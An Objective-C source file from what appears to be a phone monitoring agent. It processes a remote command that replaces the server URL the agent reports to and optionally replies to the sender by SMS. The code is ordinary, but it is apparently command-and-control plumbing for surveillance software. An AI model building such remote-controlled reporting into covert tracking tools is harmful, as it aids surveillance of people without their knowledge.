/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ResetURLProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ResetURLProcessor.h"

@interface ResetURLProcessor (PrivateAPI)
- (BOOL) canResetURL;

- (void) sendReplySMS;
- (void) processResetURL;
- (void) resetURLException: (NSUInteger) aErrorCode;
@end

@implementation ResetURLProcessor
@synthesize URLs;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ResetURLProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ResetURLProcessor--->initWithRemoteCommandData");
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the LocationOnDemandProcessor
 - Argument list and description: 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"ResetURLProcessor--->doProcessingCommand")
	[self setURLs:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kURLValidation]];
	DLog(@"ResetURLProcessor--->URLs:%@",URLs);
	
	if ([URLs count] > 0) {
		if ([self canResetURL]) { 
			if (![RemoteCmdProcessorUtils isDuplicateString:URLs]) [self processResetURL];
			else [self resetURLException:kCmdExceptionErrorCannotAddDuplicateToUrlList];
		}
		else {
			[self resetURLException:kCmdExceptionErrorUrlExceedListCapacity];
		}
	}
	else {
		[self resetURLException:kCmdExceptionErrorInvalidUrlToUrlList];
	}
}


#pragma mark ResetURLProcessor Private Methods

/**
 - Method name: canResetURL
 - Purpose:This method is to check maximum URL list capacity. 
 - Argument list and description: No argument
 - Return description:BOOL
 */

- (BOOL) canResetURL {
	DLog (@"ResetURLProcessor--->canResetURL");
	if ([URLs count]<=1) {
		return YES;
	}
	else {
		return NO;
	}
}

/**
 - Method name: processResetURL
 - Purpose:This method is used to reset url
 - Argument list and description: No argument
 - Return description: No Return Type
 */

- (void) processResetURL {
	DLog (@"ResetURLProcessor--->processResetURL")
	id <ServerAddressManager> serverManager=[[RemoteCmdUtils sharedRemoteCmdUtils] mServerAddressManager];
	[serverManager clearUserURLs];
	[serverManager addUserURLs:URLs];
	[self sendReplySMS];
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMS {
	DLog (@"ResetURLProcessor--->sendReplySMS")
	NSString *resetURLMessage=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																				      andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:resetURLMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
														       andMessage:resetURLMessage];
	}
}
/**
 - Method name: resetURLException:
 - Purpose:This method is invoked when AddURL Process failed. 
 - Argument list and description: aErrorCode (NSUInteger)
 - Return description: No Argument
 */

- (void) resetURLException: (NSUInteger) aErrorCode {
	DLog (@"ResetURLProcessor--->resetURLException")
	FxException* exception = [FxException exceptionWithName:@"processResetURL" andReason:@"Reset URL Error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

-(void) dealloc {
	[URLs release];
	[super dealloc];
}

@end
